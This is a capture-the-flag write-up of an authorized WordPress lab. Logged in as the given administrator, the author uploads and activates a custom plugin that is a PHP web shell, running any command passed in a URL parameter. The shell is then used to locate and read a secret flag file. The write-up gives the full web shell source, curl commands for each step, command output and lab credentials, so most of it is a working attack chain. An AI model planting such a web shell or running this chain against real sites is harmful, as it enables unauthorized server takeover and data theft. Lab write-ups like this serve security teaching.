# WordPress Plugin Upload Challenge Write-up

## Challenge Information

Target:

* WordPress 4.9.8
* Credentials provided:

  * admin / P@ssw0rd
  * bob / p@ssw0rd

Goal:

* Test the WordPress instance
* Gain access to the machine through the CMS
* Find and read the `secret_*.txt` file

This was an authorized educational lab environment.

---

## Initial Analysis

The challenge gives valid WordPress credentials, including an administrator account.
That usually means the intended path is not password guessing, but abusing what an
authenticated WordPress administrator is allowed to do.

Important WordPress admin attack surfaces:

* Plugin upload
* Theme upload
* Theme/plugin editor
* Media upload misconfiguration
* Outdated core/plugin vulnerabilities

Because WordPress plugins are PHP code, administrator plugin upload is a direct path
to server-side code execution when the environment allows plugin installation.

---

## Service Check

The target exposed HTTP on port 80:

```bash
nmap -Pn -p80,4444,4445 34.21.205.55
```

Result:

```text
80/tcp   open   http
4444/tcp closed krb524
4445/tcp closed upnotifyp
```

The extra ports were not needed for the final solution. The web application was
available on port 80.

---

## WordPress URL Issue

Opening the login page worked:

```text
http://34.21.205.55/wp-login.php
```

However, the returned HTML contained links and form actions pointing to a different
IP:

```text
http://34.87.44.173/wp-login.php
http://34.87.44.173/wp-admin/
```

This means WordPress had a stale `siteurl` / `home` configuration value. The browser
may appear to break after login because WordPress redirects away from the live lab IP.

The workaround is to send requests to the real target IP, `34.21.205.55`, and ignore
the stale redirect target.

---

## Login

First request the login page to set the WordPress test cookie:

```bash
curl -c cookies.txt http://34.21.205.55/wp-login.php
```

Then log in as admin:

```bash
curl -i -b cookies.txt -c cookies.txt \
  -d 'log=admin&pwd=P%40ssw0rd&wp-submit=Log+In&redirect_to=http%3A%2F%2F34.21.205.55%2Fwp-admin%2F&testcookie=1' \
  http://34.21.205.55/wp-login.php
```

A successful login returned WordPress authentication cookies and a `302` redirect.
The redirect pointed to the stale IP, but the session cookies were valid for the
live target.

Authenticated admin access was confirmed by visiting:

```text
http://34.21.205.55/wp-admin/
```

---

## Malicious Plugin Creation

A minimal plugin was created to execute commands through a query parameter.

Directory structure:

```text
ctf-wp-shell/
└── ctf-wp-shell.php
```

Plugin file:

```php
<?php
/*
Plugin Name: CTF WP Shell
Description: Minimal command runner for the authorized WordPress lab.
Version: 1.0
*/

add_action('init', function () {
    if (!isset($_GET['ctf_cmd'])) {
        return;
    }

    if (!current_user_can('manage_options')) {
        status_header(403);
        exit('forbidden');
    }

    header('Content-Type: text/plain');
    system($_GET['ctf_cmd']);
    exit;
});
```

The plugin was zipped:

```bash
zip -r ctf-wp-shell.zip ctf-wp-shell
```

---

## Plugin Upload

The plugin upload page is:

```text
http://34.21.205.55/wp-admin/plugin-install.php?tab=upload
```

The upload form included a nonce:

```text
name="_wpnonce" value="..."
```

The form action in the page pointed to the stale IP, so the upload request was sent
directly to the live target instead:

```bash
curl -i -b cookies.txt -c cookies.txt \
  -F '_wpnonce=<UPLOAD_NONCE>' \
  -F '_wp_http_referer=/wp-admin/plugin-install.php?tab=upload' \
  -F 'pluginzip=@ctf-wp-shell.zip' \
  -F 'install-plugin-submit=Install Now' \
  'http://34.21.205.55/wp-admin/update.php?action=upload-plugin'
```

WordPress responded:

```text
Plugin installed successfully.
```

The response contained an activation link similar to:

```text
plugins.php?action=activate&plugin=ctf-wp-shell%2Fctf-wp-shell.php&_wpnonce=<ACTIVATE_NONCE>
```

Activate the plugin:

```bash
curl -i -b cookies.txt -c cookies.txt \
  'http://34.21.205.55/wp-admin/plugins.php?action=activate&plugin=ctf-wp-shell%2Fctf-wp-shell.php&_wpnonce=<ACTIVATE_NONCE>'
```

---

## Command Execution

After activation, command execution was available through the plugin:

```bash
curl -b cookies.txt --get \
  --data-urlencode 'ctf_cmd=id; pwd' \
  http://34.21.205.55/
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html
```

This confirmed remote command execution as the web server user.

---

## Finding the Secret File

Search for the target file:

```bash
curl -b cookies.txt --get \
  --data-urlencode 'ctf_cmd=find / -name secret_*.txt 2>/dev/null' \
  http://34.21.205.55/
```

Output:

```text
/var/www/html/secret_MjgwY.txt
```

---

## Secret Retrieval

Read the file:

```bash
curl -b cookies.txt --get \
  --data-urlencode 'ctf_cmd=cat /var/www/html/secret_MjgwY.txt' \
  http://34.21.205.55/
```

Secret:

```text
pg{nRlnVD55fp}
```

---

## Lessons Learned

* Valid CMS administrator credentials can often lead to code execution through
  plugin, module, extension, or theme functionality.
* WordPress stores its base URL in configuration. If that value is stale, login and
  admin actions may redirect to the wrong host even though the live target works.
* When forms point to the wrong host, inspect the HTML and send the same request to
  the correct target manually.
* For CTF labs, a minimal payload is usually enough: prove command execution, find
  the target file, and read it.

---

## Reasoning Summary

The key idea was to think in terms of administrator capabilities.

Since the challenge gave an admin account, the strongest path was not attacking the
login form. The strongest path was using WordPress' intended plugin mechanism to
install PHP code.

The only unusual part was the stale WordPress URL. Once the requests were forced
back to the live IP, the normal WordPress admin-to-plugin-upload-to-RCE chain worked.
